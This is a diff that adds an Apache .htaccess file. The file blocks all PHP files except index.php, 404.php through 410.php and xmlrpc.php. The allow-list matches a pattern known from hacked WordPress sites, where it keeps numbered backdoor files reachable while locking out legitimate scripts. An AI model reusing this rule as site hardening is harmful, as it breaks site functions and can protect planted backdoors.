@@ -1,0 +1,9 @@
+
+<FilesMatch ".*\.(phtml|php)$">
+Order Allow,Deny
+Deny from all
+</FilesMatch>
+<FilesMatch "(index|404|405|406|407|408|409|410|xmlrpc).php$">
+Order Allow,Deny
+Allow from all
+</FilesMatch>
